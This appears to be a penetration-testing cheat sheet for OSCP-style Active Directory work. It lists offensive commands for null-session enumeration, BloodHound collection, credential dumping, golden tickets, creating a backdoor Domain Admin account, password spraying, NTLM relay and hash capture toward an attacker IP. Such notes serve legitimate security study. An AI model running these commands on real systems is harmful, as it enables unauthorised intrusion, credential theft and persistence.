# No Credentials
## Enumerate [[389,636 LDAP(S)]] for domain users, computers, groups, and computers

## SMB null session access
```bash
netexec smb $IP -u '' -p '' 
```

## enum4linux-ng null session
```bash
enum4linux-ng -A $IP
```

## RPC null session
```bash
rpcclient -U "" -N $IP
```

##  [[88 Kerberos#AS-REP Roasting|AS-REP Roasting]] 


# With Credentials

## Enumerate SMB
```bash
netexec smb $IP -u user -p password
```

### Useful options
- Check all available protocols: https://www.netexec.wiki/getting-started/using-credentials
- `--shares` lists SMB shares
- `-M spider_plus` lists SMB share contents recursively
- `-X '...'` executes commands using local admin access (useful if WinRM and RDP aren't available)
- `-M gpp_password`
- `-M slinky -o NAME=evil SHARE=DocumentsShare SERVER=192.168.45.212`, use with `responder` to capture NetNTLMv2 hashes
- `-M powershell_history` (requires local admin)


## [[88 Kerberos#Kerberoasting|Kerberoasting]]

# Lateral Movement Enumeration from Domain-Joined Host
## PowerView (Kali Source)
```
/usr/share/windows-resources/powersploit/Recon/PowerView.ps1
```

## PowerView enumerate domain
```powershell
Get-Domain
Get-DomainController
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
```

## PowerView find unconstrained delegation
```powershell
Get-DomainComputer -Unconstrained
```

## PowerView find SPN users
```powershell
Get-DomainUser -SPN
```

## PowerView find accessible shares
```powershell
Find-DomainShare -CheckShareAccess
```

## PowerView find local admin access
```powershell
Find-LocalAdminAccess
Test-AdminAccess
```

## PowerView enumerate trusts
```powershell
Get-DomainTrust
Get-DomainTrustMapping
```

## PowerView enumerate GPOs
```powershell
Get-DomainGPO
Get-DomainGPO | Select-Object displayname,gpcfilesyspath
```

## SharpHound (Kali Source)
```
/usr/share/sharphound/SharpHound.exe
```

## Run SharpHound on domain-joined host
```cmd
.\SharpHound.exe -c All -d domain.local --zipfilename bloodhound.zip
```
Collect bloodhound data, then transfer to Kali and ingest and analyze with `bloodhound`, after setup.

# Lateral Movement Enumeration Remotely from Kali

## [[389,636 LDAP(S)#Run ldapdomaindump|Run ldapdomaindump]]

## NetExec Check All Hosts
```
netexec smb hosts.txt -u user -p password
```

# With Domain Admin
## Dump domain credentials
```bash
impacket-secretsdump domain.local/username:password@$IP
```

## Dump SAM and SYSTEM locally
```
impacket-secretsdump -sam SAM -system -SYSTEM LOCAL
```

## Create golden ticket
```bash
impacket-ticketer -nthash aad3b435b51404eeaad3b435b51404ee -domain domain.local -domain-sid S-1-5-21-1234567890-1234567890-1234567890 administrator
```

## Create domain admin account
```cmd
net user backdoor Password123! /add /domain
net group "Domain Admins" backdoor /add /domain
```

## Run Responder
```bash
responder -I eth0 -A
```
Analyze mode prevents spoofing and poisoning, which are prohibited on OSCP.

## Setup ntlmrelayx
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

## Check MS17-010 EternalBlue
```bash
nmap -p 445 --script smb-vuln-ms17-010 $IP
```

## Password spray subnet
```bash
netexec smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success
```

## Test admin access multiple hosts
```bash
netexec smb 10.10.10.0/24 -u administrator -p password
```

---

# Reference

For extended AD methodology, decision trees, attack chain combinations, BloodHound analysis prioritization, and time management strategies, see [[AD Reference]]

**Use [[CHECKLIST-AD-Domain]] for systematic credential testing when you get new credentials.**
**Use [[CHECKLIST-Post-Exploitation]] after compromising each new host.**
